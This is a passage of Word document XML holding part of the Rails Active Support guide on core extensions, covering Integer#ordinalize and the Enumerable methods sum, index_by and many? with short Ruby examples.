              <w:t>-134.ordinal # =&gt; "th"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2D8B02CD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/integer/inflections.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48F7505C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">7.3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ordinalize</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52D2A3C0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ordinalize</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns the ordinal string corresponding to the receiver integer. In comparison, note that the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ordinal</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method returns </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>only</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> the suffix string.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3480"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="62A24A80" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="75E0DDC7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>1.ordinalize    # =&gt; "1st"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4EA9241D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>2.ordinalize    # =&gt; "2nd"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="49DB3A16" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>53.ordinalize   # =&gt; "53rd"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A5037C1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>2009.ordinalize # =&gt; "2009th"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7277D82D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>-21.ordinalize  # =&gt; "-21st"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7AAD3A4B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>-134.ordinalize # =&gt; "-134th"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="07110910" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/integer/inflections.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33956841" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">8 Extensions to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>BigDecimal</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05CD5D5C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>…</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32833A6F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">9 Extensions to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Enumerable</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F658E03" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">9.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>sum</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2605F331" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>sum</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> adds the elements of an enumerable:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2880"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="2B6E9640" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4D4F5A12" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>[1, 2, 3].sum # =&gt; 6</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="783F3203" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(1..100).sum  # =&gt; 5050</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4C86E426" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Addition only assumes the elements respond to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>+</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7200"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="3357CD8C" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6DEB69E8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>[[1, 2], [2, 3], [3, 4]].sum    # =&gt; [1, 2, 2, 3, 3, 4]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B4ADCE4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%w(foo bar baz).sum             # =&gt; "foobarbaz"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="02092186" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>{:a</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1, :b</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 2, :c</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 3}.sum # =&gt; [:b, 2, :c, 3, :a, 1]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4A7552B8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The sum of an empty collection is zero by default, but this is customizable:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2280"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="791E921D" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="11F34C0A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>[].sum    # =&gt; 0</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3DB8E463" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>[].sum(1) # =&gt; 1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="24D84ECF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If a block is given, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>sum</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> becomes an iterator that yields the elements of the collection and sums the returned values:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4080"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="5A4CE53F" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="195420CF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(1..5).sum {|n| n * 2</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>} # =&gt; 30</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4B7B7539" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>[2, 4, 6, 8, 10].sum    # =&gt; 30</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="53037E0C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The sum of an empty receiver can be customized in this form as well:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3240"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="6235D686" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="48077C3C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="201671036"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>[].sum(1) {|n| n**3} # =&gt; 1</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4673AC85" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveRecord::Observer#observed_subclasses</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for example is implemented this way:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7680"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="7A4DAA47" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5EAE3BFD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>observed_subclasses</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5D40324C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  observed_classes.sum([]) { |klass| klass.send(:subclasses) }</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="02D68234" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="108A5824" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/enumerable.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26640850" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">9.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>index_by</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="669FB77B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>index_by</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> generates a hash with the elements of an enumerable indexed by some key.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="184EE265" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>It iterates through the collection and passes each element to a block. The element will be keyed by the value returned by the block:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8160"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="16BAD0C3" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="25500812" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>invoices.index_by(&amp;:number)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0A526A0B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; {'2009-032' =&gt; &lt;Invoice ...&gt;, '2009-008' =&gt; &lt;Invoice ...&gt;, ...}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="17E77520" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Keys should normally be unique. If the block returns the same value for different elements no collection is built for that key. The last item will win.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25850D84" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/enumerable.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C643FF7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">9.3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>many?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CF6DDB8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>many?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is shorthand for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>collection.size &gt; 1</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3168"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="3AE9866F" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="15A4A068" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>pages.many? %&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="67AA70F9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;%=</w:t>
            </w:r>
            <w:r>
